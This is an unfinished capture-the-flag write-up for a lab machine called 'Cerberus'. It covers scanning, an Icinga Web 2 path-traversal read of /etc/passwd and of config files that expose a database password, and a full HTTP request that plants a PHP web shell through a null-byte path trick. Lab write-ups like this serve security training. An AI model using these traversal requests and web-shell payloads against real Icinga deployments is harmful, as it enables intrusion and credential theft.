# Cerberus

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 10.129.189.80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 11:23 EDT
Nmap scan report for 10.129.189.80
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

We have to add `icinga.cerberus.local` to our `/etc/hosts` file in order to access port 8080.&#x20;

### Icinga LFI

Visiting port 8080 reveals this login page:

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

A bit of research reveals that Icinga is a network monitoring tool. Default credentials don't work, so we can head straight into a directory scan.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://icinga.cerberus.local:8080/icingaweb2 -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://icinga.cerberus.local:8080/icingaweb2
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/03/19 11:31:59 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/0                    (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login]
/About                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=About]                                                                                       
/Index                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=Index]                                                                                       
/Health               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=Health]                                                                                      
/Default              (Status: 500) [Size: 4321]
/Search               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=Search]                                                                                      
/about                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=about]                                                                                       
/account              (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=account]                                                                                     
/announcements        (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=announcements]                                                                               
/config               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=config]                                                                                      
/css                  (Status: 301) [Size: 346] [--> http://icinga.cerberus.local:8080/icingaweb2/css/]                                                                                   
/dashboard            (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=dashboard]                                                                                   
/default              (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=default]                                                                                     
/font                 (Status: 301) [Size: 347] [--> http://icinga.cerberus.local:8080/icingaweb2/font/]                                                                                  
/group                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=group]                                                                                       
/health               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=health]                                                                                      
/iframe               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=iframe]                                                                                      
/img                  (Status: 301) [Size: 346] [--> http://icinga.cerberus.local:8080/icingaweb2/img/]                                                                                   
/index                (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=index]                                                                                       
/js                   (Status: 301) [Size: 345] [--> http://icinga.cerberus.local:8080/icingaweb2/js/]                                                                                    
/layout               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=layout]                                                                                      
/list                 (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=list]                                                                                        
/navigation           (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=navigation]                                                                                  
/role                 (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=role]                                                                                        
/search               (Status: 302) [Size: 0] [--> /icingaweb2/authentication/login?redirect=search]
```

Found some interesting directories, but nothing was useful because we didbn't have any credentials. Decided to enumerate on possible Icinga2 exploits online, and found some useful directory traversal related exploits.

{% embed url="https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/" %}

We can follow the PoC present on the page, and find that it works!

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts 
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
ntp:x:108:113::/nonexistent:/usr/sbin/nologin
sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
icingadb:x:999:999::/etc/icingadb:/sbin/nologin
```

What was interesting is that, this is a Windows machine but it seems a Linux container is hosting it. Next, we can note that `172.16.22.1` is hosting the DC from the hosts file we read. Next, we can attempt to read some configuration files for this Icinga instance for the authentication or anything at all. The Icinga documentation reveals that there is some stored `/etc/icingaweb2/authentication.ini`.

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini
[icingaweb2]
backend = "db"
resource = "icingaweb2"
```

So there's a backend `db` for this website, and based on the documentation, it's likely a MySQL or PostgreSQL database.

{% embed url="https://icinga.com/docs/icinga-web/latest/doc/04-Resources/" %}

Checking the `resources.ini` file reveals some credentials.

```
$ curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0
```

With these credentials, we can login to the Icinga Web instance!

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Icinga as Matthew --> RCE

I looked around, and determined that this was running **Icinga Web 2 Version 2.9.2**, which could be useful later. On the original page that gave us the directory traversal exploit, there was another RCE exploit, but I'm not sure how to exploit it yet.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

I also found that as `matthew`, we could create new users. Reading the code from the Sonar website, we can see that there's a `/$configDir/ssh/matthew` directory that can store a private key.&#x20;

```php
public static function beforeAdd(ResourceConfigForm $form)
{
    $configDir = Icinga::app()->getConfigDir();
    $user = $form->getElement('user')->getValue();
    $filePath = $configDir . '/ssh/' . $user; // [1]
    if (! file_exists($filePath)) {
        $file = File::create($filePath, 0600);
    // [...]
    $file->fwrite($form->getElement('private_key')->getValue()); // [2]
```

This, combined with the RCE exploit above is a clear attack vector. We need to generate an SSH key and upload it (somehow) with the malicious path containing a reverse shell.

First we need to change the `global_module_path` to `/dev` as per the PoC. This can be done in `/config/general`.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Then, we can quickly enable the `shm` module in `/config/moduleenable`.&#x20;

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Afterwards, we need to create a new resource with a private SSH key and upload it. Thsi can be done through `/config/resource` and adding resources for SSH Identities. Afterwards, we can simply send another request with our exploit:

{% code overflow="wrap" %}
```http
POST /icingaweb2/config/createresource HTTP/1.1
Host: icinga.cerberus.local:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Icinga-Accept: text/html
X-Icinga-Container: col2
X-Icinga-WindowId: jaevlhxwkugs_fgnrls
X-Requested-With: XMLHttpRequest
Content-Length: 287
Origin: http://icinga.cerberus.local:8080
Connection: close
Referer: http://icinga.cerberus.local:8080/icingaweb2/config/resource
Cookie: Icingaweb2=tbt6c7vhlitggtddqjs9911s4v; icingaweb2-session=1679242760; icingaweb2-tzo=-14400-1



type=ssh&name=notakey&user=.../../../../../../../dev/shm/shell.php&private_key=file:///etc/icingaweb2/ssh/test\x00<?php+system($_REQUEST['cmd']);?>&formUID=form_config_resource&CSRFToken=287102571%7Cfe7a12539b6a50fd04400ed33c28c9cd4db0ae08f0d2333067009010bd9c1861&btn_submit=Save+Changes
```
{% endcode %}

Visting the URL below would give us RCE!

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

With this, we can get a reverse shell.

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

I ran LinPEAS on the machine to enumerate for me. We can find some ports that are open:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

The MySQL database has nothing of interest. Port 80 was hosting nothing as well. For SUID binaries, there were two that I didn't usually see:

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

We can check its version:

```
www-data@icinga:/etc$ firejail --version
firejail version 0.9.68rc1
```

Technically this was exploitable and there are PoCs out there for this version, but the docker seems to have non of the imports required. \
Moving on, we can look at the Linux version:

```
www-data@icinga:/tmp$ uname -a
Linux icinga 5.15.0-43-generic #46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Hard machine. Will continue to work on it.&#x20;
